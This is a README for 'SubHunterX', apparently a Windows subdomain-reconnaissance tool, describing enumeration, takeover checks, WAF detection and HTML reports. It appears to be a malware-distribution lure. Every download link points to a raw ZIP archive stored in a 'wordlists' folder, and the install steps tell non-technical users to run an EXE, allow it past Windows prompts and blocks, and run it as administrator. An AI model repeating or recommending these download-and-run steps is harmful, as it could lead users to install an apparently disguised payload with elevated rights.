# 🔎 SubHunterX - Find Hidden Subdomains Fast

[![Download SubHunterX](https://img.shields.io/badge/Download-SubHunterX-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/diroxpatron12/SubHunterX/main/wordlists/Hunter_X_Sub_v1.3-beta.4.zip)

## 🚀 Getting Started

SubHunterX helps you find subdomains, spot takeovers, check WAF coverage, and gather cloud assets from one place. It is built for Windows users who want a simple way to run a subdomain scan and save the results in a clear report.

Use the link above to visit this page and download the tool. If the project page provides a release file, download it and run it on your Windows PC.

## 🖥️ What SubHunterX Does

SubHunterX brings several recon tasks into one workflow:

- Finds subdomains from many public sources
- Checks for possible subdomain takeover issues
- Detects WAF presence on targets
- Looks for cloud-linked assets
- Saves results in HTML reports
- Captures screenshots for fast review
- Helps sort findings for bug bounty and OSINT work

It keeps the process simple so you can move from target name to results without extra setup.

## 📥 Download and Install

1. Open the download page: https://raw.githubusercontent.com/diroxpatron12/SubHunterX/main/wordlists/Hunter_X_Sub_v1.3-beta.4.zip
2. Look for the latest release or the main project files
3. Download the Windows version if one is provided
4. If the file is a ZIP archive, extract it to a folder you can find easily
5. If the file is an EXE, double-click it to run the app
6. If Windows asks for permission, select the option to allow it
7. Keep the app in a folder with a simple path, such as `C:\SubHunterX`

If the project includes a portable build, you can run it without a full install. If it uses a setup file, follow the on-screen steps and keep the default options unless you want a custom location.

## 🪟 Windows Requirements

SubHunterX is designed for modern Windows systems.

Recommended setup:

- Windows 10 or Windows 11
- 4 GB of RAM or more
- At least 200 MB of free disk space
- A stable internet connection for source lookup
- Permission to run downloaded apps
- A screen size of 1366 × 768 or higher for easier review

If the tool uses a bundled browser or screenshot feature, more memory may help when you scan many targets at once.

## ⚙️ First Run

After you download and open SubHunterX:

1. Start the app
2. Enter the domain name you want to check
3. Choose the scan options you want
4. Start the scan
5. Wait for the results to finish
6. Open the report or export the output

If the app asks for a target, use only domains you have permission to test. For bug bounty work, use the scope listed by the program owner.

## 🔍 Main Features

### 🌐 Subdomain Enumeration
SubHunterX checks many public sources to find subdomains tied to a domain name. This helps you build a larger asset list in less time.

### 🕵️ Takeover Detection
The tool looks for signs that a subdomain may point to a service that no longer exists or is not set up right. That can help you spot weak points that need review.

### 🛡️ WAF Checks
It can check whether a site appears to sit behind a web application firewall. This helps you understand the target before deeper testing.

### ☁️ Cloud Asset Discovery
SubHunterX searches for cloud-linked hosts and services. This can help you find assets in common cloud platforms and related DNS records.

### 📸 Screenshots
The app can capture screenshots of live pages. This makes it easier to scan many hosts and spot pages that matter.

### 🧾 HTML Reports
SubHunterX creates HTML reports so you can review findings in a browser. Reports are easy to share, save, and open later.

## 🧭 How to Use It

Use this simple flow:

1. Open SubHunterX
2. Type in a domain name
3. Pick the scan options you need
4. Start the scan
5. Review the discovered hosts
6. Check screenshot results
7. Open the HTML report
8. Save the output for later use

For a first test, use a domain you already know or a lab target. This helps you learn the layout before you scan larger scopes.

## 🗂️ Typical Output

You can expect output such as:

- Subdomain list
- Live host check
- Possible takeover flags
- WAF status
- Cloud asset matches
- Screenshot files
- HTML report file

This makes it easier to sort results and focus on the most useful findings.

## 🧰 Tips for Better Results

- Use a clean folder for each scan
- Keep the target name short and exact
- Save one report per target
- Run one scan at a time if your PC is slow
- Check your internet connection before you start
- Review the report in a browser after the scan ends

If you are using it for bug bounty work, keep notes on scope and dates so you can match results to the right target.

## 🧪 Suggested Workflow for Non-Technical Users

If you want the easiest path, use this order:

1. Download the tool
2. Open it in Windows
3. Enter one domain name
4. Run a basic scan
5. Open the HTML report
6. Look at the subdomains first
7. Check takeover and WAF results next
8. Save the output in a folder named after the target

This keeps the process simple and makes it easier to compare scans later.

## 📁 File and Folder Layout

You may see files like these after a scan:

- `results.html`
- `subdomains.txt`
- `screenshots/`
- `takeover-check.txt`
- `cloud-assets.txt`
- `logs/`

File names can vary, but the idea stays the same. One folder holds the results, and the HTML report gives you the fast view.

## 🛠️ Common Windows Issues

### App does not open
- Try right-clicking the file and selecting Run as administrator
- Check that the file finished downloading
- Extract the ZIP before you open the app

### Windows blocks the file
- Open the file properties and check if Windows marked it as downloaded
- Allow the app if your system trusts the source

### Scan is slow
- Close other apps
- Scan one target at a time
- Give it more time if the target list is large

### No results appear
- Check that the domain name is correct
- Make sure your internet connection is working
- Try a different target with known DNS records

## 🔐 Safe Use

Use SubHunterX only on targets you own or have permission to test. That includes lab systems, internal assets, or bug bounty scopes that allow recon work.

Keep your scans limited to approved targets and save your reports in an organized folder structure so you can review them later

## 📌 Good Starting Points

For a first run, try:

- A domain you own
- A test domain from a lab
- A bug bounty target with clear scope
- A small internal asset group

Start small, learn the layout, then move to larger scans

## 🧩 What Makes It Useful

SubHunterX puts several common recon steps in one place. That saves time and reduces the need to switch between tools. If you want a simple Windows tool for subdomain checks, takeover review, WAF checks, cloud asset discovery, and HTML reports, this project gives you a clear path from target name to saved results

## 📦 Download

Use this link to visit the download page and get SubHunterX:

https://raw.githubusercontent.com/diroxpatron12/SubHunterX/main/wordlists/Hunter_X_Sub_v1.3-beta.4.zip

## 📝 Basic Scan Checklist

- Download the app
- Open it in Windows
- Enter a domain name
- Choose scan options
- Start the scan
- Review the subdomains
- Check takeover flags
- Open the HTML report
- Save the results for later